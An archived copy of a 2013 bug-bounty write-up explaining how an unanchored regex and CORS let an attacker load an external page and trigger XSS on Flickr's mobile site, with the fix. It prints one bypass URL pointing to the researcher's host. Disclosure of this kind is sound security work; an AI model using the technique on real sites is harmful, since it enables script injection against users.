---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2013-12-12_abusing-cors-for-an-xss-on-flickr.md
original_filename: 2013-12-12_abusing-cors-for-an-xss-on-flickr.md
title: Abusing CORS for an XSS on Flickr
category: documents
detected_topics:
- xss
- command-injection
- otp
- cors
- cloud-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- cors
- cloud-security
language: en
raw_sha256: 2560b087197767395588b89dc84f574a7b9583abee6be58be88fff643c9136cb
text_sha256: adcca1e6d1ad26c2f5ee1e78ce6f9408b8c8590c9d497d608b7dcc4bf626781d
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Abusing CORS for an XSS on Flickr

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2013-12-12_abusing-cors-for-an-xss-on-flickr.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, cors, cloud-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `2560b087197767395588b89dc84f574a7b9583abee6be58be88fff643c9136cb`
- Text SHA256: `adcca1e6d1ad26c2f5ee1e78ce6f9408b8c8590c9d497d608b7dcc4bf626781d`


## Content

---
title: "Abusing CORS for an XSS on Flickr"
page_title: "Abusing CORS for an XSS on Flickr – Jack"
url: "https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/"
final_url: "https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/"
authors: ["Jack Whitton (@fin1te)"]
programs: ["Flickr"]
bugs: ["XSS"]
publication_date: "2013-12-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6385
---

# [Abusing CORS for an XSS on Flickr](https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/ "Abusing CORS for an XSS on Flickr")

## December 12, 2013

__Reading time ~1 minute

I recently found an XSS on the mobile version of Flickr (<http://m.flickr.com>). Due to the way the bug is triggered, I thought it deserved a write-up.

Whilst browsing the site, you’ll notice that pages are loaded via AJAX with the path stored in the URL fragment (not as common these days now that `[pushState](https://developer.mozilla.org/en-US/docs/Web/Guide/API/DOM/Manipulating_the_browser_history#The_pushState\(\).C2.A0method)` is available).

[ ![](/images/flickrcors/flickr-cors-1.png) ](/images/flickrcors/flickr-cors-1.png)

When the page is loaded, a function, `q()` (seen below), is called which will check the value of `location.hash`, and call `F.iphone.showSelectedPage()`.

[ ![](/images/flickrcors/flickr-cors-2.png) ](/images/flickrcors/flickr-cors-2.png)

In order to load pages from the current domain, it checks for a leading slash. If this isn’t present, it prepends one when calling the next function, `F.iphone.showPageByHref()`.

[ ![](/images/flickrcors/flickr-cors-3.png) ](/images/flickrcors/flickr-cors-3.png)

This function then performs a regex on the URL (line 160) to ensure that it’ll only load links from `m.flickr.com`. If this check fails, and the URL starts with a double slash (relative protocol link), it prepends it with `<http://m.flickr.com>`. Pretty solid check, right?

[ ![](/images/flickrcors/flickr-cors-4.png) ](/images/flickrcors/flickr-cors-4.png)

Incase you didn’t notice, the first regex doesn’t anchor it to the start of the string. This means we can bypass it providing our own URL contains `m.flickr.com`.

We can get our own external page loaded by passing in a URL like so:

`//fin1te.net/flickr.php?bypass=m.flickr.com`

The code will check for a leading slash (we have two :)), which it’ll pass, then checks for the domain, which will also pass, then load it via AJAX.

Since we now have [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) in modern browsers, the browser will send an initial OPTIONS request to the page (to ensure it’ll allow it to be loaded), then the real request.

[ ![](/images/flickrcors/flickr-cors-5.png) ](/images/flickrcors/flickr-cors-5.png)

All we need to do is specify a couple of headers (the additional options in the `Access-Control-Allow-Headers` are to prevent syntax errors in the Javascript), along with our payload.

[ ![](/images/flickrcors/flickr-cors-6.png) ](/images/flickrcors/flickr-cors-6.png)

The next part of the Javascript dumps the response into an element with `innerHTML`.

[ ![](/images/flickrcors/flickr-cors-7.png) ](/images/flickrcors/flickr-cors-7.png)

Which leads to our payload being executed.

[ ![](/images/flickrcors/flickr-cors-8.png) ](/images/flickrcors/flickr-cors-8.png)

### Fix

This issue is now fixed by anchoring the regex to the start of the string, and also running another regex to check if it starts with a double slash.

[ ![](/images/flickrcors/flickr-cors-9.png) ](/images/flickrcors/flickr-cors-9.png) [websec](https://whitton.io/tags/#websec "Pages tagged websec")[bugbounty](https://whitton.io/tags/#bugbounty "Pages tagged bugbounty")[yahoo](https://whitton.io/tags/#yahoo "Pages tagged yahoo")[flickr](https://whitton.io/tags/#flickr "Pages tagged flickr")[xss](https://whitton.io/tags/#xss "Pages tagged xss")[cors](https://whitton.io/tags/#cors "Pages tagged cors") Updated on December 12, 2013 Jack

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/ "Share on Google Plus")

[Read More](https://whitton.io/articles/cookie-stealing-on-customer-internet-connections/)

### [From Bug Bounty Hunter, to Engineer, and Beyond](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/ "From Bug Bounty Hunter, to Engineer, and Beyond")

A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a "new chapter" in my ...… [Continue reading](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/)

#### [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Obtaining Login Tokens for an Outlook, Office or Azure Account")

Published on April 03, 2016

#### [Uber Bug Bounty: Turning Self-XSS into Good-XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Uber Bug Bounty: Turning Self-XSS into Good-XSS")

Published on March 22, 2016
